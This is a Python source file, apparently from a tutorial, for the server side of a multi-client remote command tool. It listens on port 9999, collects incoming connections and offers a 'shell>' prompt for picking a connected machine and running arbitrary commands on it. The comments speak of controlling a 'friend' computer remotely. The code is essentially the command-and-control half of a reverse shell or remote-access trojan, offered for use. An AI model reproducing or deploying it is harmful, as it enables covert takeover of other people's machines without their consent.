import socket
import sys  # used to implement command lines
import threading  # used to perform multiple tasks
import time
from queue import Queue

Number_of_threads = 2
job_ids = [1, 2]  # job of 1st thread is to listen for connection and 2nd thread send command to client
queue = Queue()
all_connections = []
all_address = []


# 1st THREAD
# creating socket to connect two different computers
def create_socket():
    # handling any type of error
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    # printing the error
    except socket.error as msg:
        print("Socket error " + msg)


# Binding the socket and listening for connection
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the socket " + str(port))
        s.bind((host, port))  # binding host and port
        s.listen(5)  # it will listen for 5 times after that it will throw an error if connections not est.

    except socket.error as msg:
        print("Socket error " + msg + "\n" + "retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread function -> 1. see all available clients  2. select a client  3. send command to a connected client
# interactive prompt(shell) for sending commands
# shell> list
# 0 friend-A Port
# 1 friend-B Port
# 2 friend-C Port
# shell> select any one of them
# 192.169.0.6> dir here we are accessing computer of our client remotely


def start_shell():  # creating custom shell
    while True:
        cmd = input('shell> ')
        if cmd == 'list':  # it will show us available connections
            list_connection()
        elif 'select' in cmd:  # here we are selecting a friend with we want to send commands
            conn = get_target(cmd)
            if conn is not None:  # after the check of list_connections if for some reason our connection got disconnected in meantime
                send_target_commands(conn)
        else:
            print("Command not exist")


# display all current active connections with the client

def list_connection():
    results = ''
    id = 0
    for conn in all_connections:
        try:  # here we are checking whether our connection is active or not
            conn.send(str.encode(' '))  # sending dummy connection request to check stable connection
            conn.recv(
                201480)  # here we are getting some data in bytes(here we have taken size 201480 becoause we don;t know how big data we are going to get back)
        except:  # if we don't recieve anything back then this implies that there is no connection and this will executive
            del all_connections[id]
            del all_address[id]
            continue
        results += str(id) + "  " + str(all_address[id][0]) + "  " + str(all_address[id][1]) + "\n"
        id += 1

    print("------clients-------" + "\n" + results)


# selecting the target
# cmd = select 1/2/3
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("we are now connected to : " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">",
              end="")  # here we are not in our interactive shell anymore so command like list will not wok here dir command will work here
        # we are controlling our clients computer
        # 192.168.0.4> dir
        return conn

    except:
        print("Selection is not valid ")
        return None


# making changes in friend system
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':  # to break out from this infinity while loop
                break

            # Data is send from one computer to another in the format of bytes so we have to encode our command in byte
            # format
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")  # here we are converting back byte to string format
                print(client_response, end="")  # here is used to go to new line

        except:
            print("error sending command")
            break


# create worker thread
def create_workers():
    for _ in range(Number_of_threads):  # it creates thread one by one
        t = threading.Thread(target=work)  # here initializing thread and defining what kind of work we have to do
        t.daemon = True  # it tells program whenever the programs ends the thread should also ends
        t.start()


# do next job that is in the queue (handle connections and send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_shell()

        queue.task_done()


# creating jobs
def create_jobs():
    for x in job_ids:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
